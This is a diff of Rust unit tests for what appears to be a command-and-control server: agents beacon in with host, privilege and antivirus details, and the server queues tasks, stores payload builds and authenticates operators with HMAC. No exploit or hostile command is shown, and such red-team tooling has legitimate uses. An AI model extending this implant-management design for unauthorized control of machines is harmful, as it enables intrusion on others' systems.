+            auth: auth.clone(),
+        };
+        ApiState {
+            shared: Arc::new(Mutex::new(app)),
+            auth,
+            audit,
+        }
+    }
+
     #[test]
     fn store_round_trips_through_json() {
         let store = sample_store();
         let encoded = serde_json::to_string(&store).expect("store should serialize");
         let decoded: Store = serde_json::from_str(&encoded).expect("store should deserialize");
-
         assert_eq!(decoded.agents.len(), 1);
         assert_eq!(decoded.agents["agent-1"].last_seen_unix, 2);
         assert_eq!(decoded.tasks["task-1"].task.task_id, "task-1");
@@ -1680,16 +2194,13 @@ mod tests {
         let path =
             std::env::temp_dir().join(format!("nagomio-store-test-{}.db", std::process::id()));
         let _ = std::fs::remove_file(&path);
-
         let store = sample_store();
         save_store_to_db(&path, &store).expect("store should persist to sqlite");
         let decoded = load_store_from_db(&path).expect("store should load from sqlite");
-
         assert_eq!(decoded.agents["agent-1"].registration.hostname, "host");
         assert_eq!(decoded.tasks["task-1"].status, TaskStatus::Queued);
         assert_eq!(decoded.pending_tasks["agent-1"][0], "task-1");
         assert_eq!(decoded.responses["agent-1"][0].output, "operator");
-
         let _ = std::fs::remove_file(path);
     }
 
@@ -1700,7 +2211,6 @@ mod tests {
             std::process::id()
         ));
         let _ = std::fs::remove_file(&path);
-
         let conn = open_db(&path).expect("database should open");
         conn.execute(
             "INSERT INTO payloads (build_id, artifact_json) VALUES (?1, ?2)",
@@ -1722,40 +2232,26 @@ mod tests {
         )
         .expect("legacy payload row should insert");
         drop(conn);
-
         let decoded = load_store_from_db(&path).expect("legacy payload should load");
         assert_eq!(decoded.payloads["payload-legacy"].target_os, "linux");
-
         let _ = std::fs::remove_file(path);
     }
 
     #[tokio::test]
     async fn beacon_dispatches_queued_task_and_marks_it_dispatched() {
-        let state = Arc::new(Mutex::new(AppState {
-            store: Store::default(),
-            config: Config {
-                bind_addr: "127.0.0.1:0".to_owned(),
-                db_path: None,
-                state_file: None,
-                project_root: PathBuf::from("."),
-                payload_dir: PathBuf::from("payloads"),
-                download_dir: PathBuf::from("downloads"),
-                callback_url: "http://127.0.0.1:0".to_owned(),
-                default_sleep_seconds: 9,
-                api_token: None,
-                agent_token: None,
-                cors_origins: default_cors_origins(),
-                allow_unauthenticated: true,
-            },
-            db_path: None,
-            state_file: None,
-        }));
+        let api = api_state({
+            let mut s = sample_store();
+            // Remove the sample pending task so we can use a fresh state.
+            s.pending_tasks.clear();
+            s.tasks.clear();
+            s
+        });
 
         let add_req = AddTaskReq {
             agent_id: "agent-1".to_owned(),
             task: sample_task(),
         };
-        let Json(queued_task) = api_add_task(State(state.clone()), HeaderMap::new(), Json(add_req))
+        let Json(queued_task) = api_add_task(State(api.clone()), HeaderMap::new(), Json(add_req))
             .await
             .expect("task should queue");
         assert_eq!(queued_task.status, TaskStatus::Queued);
@@ -1766,26 +2262,38 @@ mod tests {
                 hostname: "host".to_owned(),
                 os: "linux".to_owned(),
                 architecture: "x86_64".to_owned(),
+                pid: 0,
+                integrity: String::new(),
+                is_elevated: false,
+                av_products: Vec::new(),
             },
         };
 
-        let Json(reply) = handle_beacon(State(state.clone()), HeaderMap::new(), Json(beacon))
+        let body = serde_json::to_string(&beacon).unwrap();
+        let resp = handle_beacon(
+            State(api.clone()),
+            HeaderMap::new(),
+            Query(BeaconQuery::default()),
+            body,
+        )
+        .await
+        .expect("beacon should succeed");
+        let body_bytes = axum::body::to_bytes(resp.into_body(), 65536)
             .await
-            .expect("beacon should succeed");
-
+            .expect("body");
+        let reply: BeaconReply = serde_json::from_slice(&body_bytes).expect("reply");
         assert_eq!(reply.sleep_seconds, 9);
         assert_eq!(reply.task.expect("task should dispatch").task_id, "task-1");
 
-        let state = state.lock().await;
-        assert_eq!(state.store.tasks["task-1"].status, TaskStatus::Dispatched);
-        assert!(state.store.tasks["task-1"].dispatched_at_unix.is_some());
+        let s = api.shared.lock().await;
+        assert_eq!(s.store.tasks["task-1"].status, TaskStatus::Dispatched);
+        assert!(s.store.tasks["task-1"].dispatched_at_unix.is_some());
     }
 
     #[test]
     fn agent_summary_classifies_last_seen_age() {
         let mut store = sample_store();
         let mut agent = store.agents.remove("agent-1").expect("agent exists");
-
         agent.last_seen_unix = 100;
         assert_eq!(agent_summary(&agent, 108, 5).status, AgentStatus::Online);
         assert_eq!(agent_summary(&agent, 120, 5).status, AgentStatus::Stale);
@@ -1794,32 +2302,31 @@ mod tests {
 
     #[test]
     fn config_uses_defaults_when_env_is_absent() {
-        let bind_addr = env::var("NAGOMIO_BIND_ADDR").ok();
-        let db_path = env::var_os("NAGOMIO_DB_PATH");
-        let state_file = env::var_os("NAGOMIO_STATE_FILE");
-        let project_root = env::var_os("NAGOMIO_PROJECT_ROOT");
-        let payload_dir = env::var_os("NAGOMIO_PAYLOAD_DIR");
-        let download_dir = env::var_os("NAGOMIO_DOWNLOAD_DIR");
-        let callback_url = env::var("NAGOMIO_CALLBACK_URL").ok();
-        let sleep_seconds = env::var("NAGOMIO_DEFAULT_SLEEP_SECONDS").ok();
-        let api_token = env::var("NAGOMIO_API_TOKEN").ok();
-        let agent_token = env::var("NAGOMIO_AGENT_TOKEN").ok();
-        let allow_unauthenticated = env::var("NAGOMIO_ALLOW_UNAUTHENTICATED").ok();
-
-        env::remove_var("NAGOMIO_BIND_ADDR");
-        env::remove_var("NAGOMIO_DB_PATH");
-        env::remove_var("NAGOMIO_STATE_FILE");
-        env::remove_var("NAGOMIO_PROJECT_ROOT");
-        env::remove_var("NAGOMIO_PAYLOAD_DIR");
-        env::remove_var("NAGOMIO_DOWNLOAD_DIR");
-        env::remove_var("NAGOMIO_CALLBACK_URL");
-        env::remove_var("NAGOMIO_DEFAULT_SLEEP_SECONDS");
-        env::remove_var("NAGOMIO_API_TOKEN");
-        env::remove_var("NAGOMIO_AGENT_TOKEN");
-        env::remove_var("NAGOMIO_ALLOW_UNAUTHENTICATED");
-
+        // Save and clear all relevant envs.
+        let saved = [
+            "NAGOMIO_BIND_ADDR",
+            "NAGOMIO_DB_PATH",
+            "NAGOMIO_STATE_FILE",
+            "NAGOMIO_PROJECT_ROOT",
+            "NAGOMIO_PAYLOAD_DIR",
+            "NAGOMIO_DOWNLOAD_DIR",
+            "NAGOMIO_CALLBACK_URL",
+            "NAGOMIO_DEFAULT_SLEEP_SECONDS",
+            "NAGOMIO_API_PSK",
+            "NAGOMIO_AGENT_PSK",
+            "NAGOMIO_API_TOKEN",
+            "NAGOMIO_AGENT_TOKEN",
+            "NAGOMIO_WIRE_ENCRYPTION",
+            "NAGOMIO_SOCKS_BIND_ADDR",
+            "NAGOMIO_ALLOW_UNAUTHENTICATED",
+        ]
+        .iter()
+        .map(|k| (*k, env::var(k).ok()))
+        .collect::<Vec<_>>();
+        for (k, _) in &saved {
+            env::remove_var(k);
+        }
         let config = Config::from_env();
-
         assert_eq!(config.bind_addr, "127.0.0.1:8080");
         assert_eq!(config.db_path, Some(PathBuf::from("nagomio.db")));
         assert!(config.state_file.is_none());
@@ -1827,42 +2334,69 @@ mod tests {
         assert_eq!(config.download_dir, PathBuf::from("downloads"));
         assert_eq!(config.callback_url, "http://127.0.0.1:8080");
         assert_eq!(config.default_sleep_seconds, 5);
-        assert!(config.api_token.is_none());
-        assert!(config.agent_token.is_none());
+        assert!(config.api_psk.is_none());
+        assert!(config.agent_psk.is_none());
         assert!(config.allow_unauthenticated);
+        for (k, v) in &saved {
+            if let Some(value) = v {
+                env::set_var(k, value);
+            }
+        }
+    }
 
-        if let Some(value) = bind_addr {
-            env::set_var("NAGOMIO_BIND_ADDR", value);
-        }
-        if let Some(value) = db_path {
-            env::set_var("NAGOMIO_DB_PATH", value);
-        }
-        if let Some(value) = state_file {
-            env::set_var("NAGOMIO_STATE_FILE", value);
-        }
-        if let Some(value) = project_root {
-            env::set_var("NAGOMIO_PROJECT_ROOT", value);
-        }
-        if let Some(value) = payload_dir {
-            env::set_var("NAGOMIO_PAYLOAD_DIR", value);
-        }
-        if let Some(value) = download_dir {
-            env::set_var("NAGOMIO_DOWNLOAD_DIR", value);
-        }
-        if let Some(value) = callback_url {
-            env::set_var("NAGOMIO_CALLBACK_URL", value);
-        }
-        if let Some(value) = sleep_seconds {
-            env::set_var("NAGOMIO_DEFAULT_SLEEP_SECONDS", value);
-        }
-        if let Some(value) = api_token {
-            env::set_var("NAGOMIO_API_TOKEN", value);
-        }
-        if let Some(value) = agent_token {
-            env::set_var("NAGOMIO_AGENT_TOKEN", value);
-        }
-        if let Some(value) = allow_unauthenticated {
-            env::set_var("NAGOMIO_ALLOW_UNAUTHENTICATED", value);
-        }
+    #[test]
+    fn auth_replay_rejected() {
+        let psk = b"psk-for-tests";
+        let auth = AuthState::default();
+        let now = unix_now() as i64;
+        let ts = now.to_string();
+        let nonce = "deadbeef".to_string();
+        let msg = format!("operator\n{ts}\n{nonce}");
+        let mac = auth::auth_hmac_for_test(psk, msg.as_bytes());
+        let mut headers = HeaderMap::new();
+        headers.insert(auth::HDR_TS, ts.parse().unwrap());
+        headers.insert(auth::HDR_NONCE, nonce.parse().unwrap());
+        headers.insert(auth::HDR_MAC, mac.parse().unwrap());
+        let rt = tokio::runtime::Runtime::new().unwrap();
+        let shared: SharedState = Arc::new(Mutex::new(AppState {
+            store: Store::default(),
+            config: Config {
+                bind_addr: "127.0.0.1:0".to_owned(),
+                db_path: None,
+                state_file: None,
+                project_root: PathBuf::from("."),
+                payload_dir: PathBuf::from("payloads"),
+                download_dir: PathBuf::from("downloads"),
+                callback_url: "http://127.0.0.1:0".to_owned(),
+                default_sleep_seconds: 5,
+                api_psk: Some("psk-for-tests".to_owned()),
+                agent_psk: None,
+                wire_encryption: false,
+                socks_bind_addr: None,
+                cors_origins: default_cors_origins(),
+                allow_unauthenticated: false,
+            },
+            db_path: None,
+            state_file: None,
+            persist_tx: tokio::sync::mpsc::unbounded_channel::<PersistEvent>().0,
+        }));
+        rt.block_on(async {
+            // First call OK.
+            let r = require_api_auth(&headers, &shared, &auth).await;
+            assert!(r.is_ok());
+            // Replay rejected.
+            let r = require_api_auth(&headers, &shared, &auth).await;
+            assert!(matches!(r, Err((StatusCode::UNAUTHORIZED, _))));
+        });
+    }
+
+    #[test]
+    fn wire_seal_open_roundtrip() {
+        let psk = b"wire-psk";
+        let plain = b"{\"hello\":\"world\"}";
+        let sealed = wire::seal(psk, wire::CTX_AGENT, plain).expect("seal");
+        let env: WireEnvelope = serde_json::from_str(&sealed).expect("envelope json");
+        let opened = wire::open(psk, &env).expect("open");
+        assert_eq!(opened, plain);
     }
 }
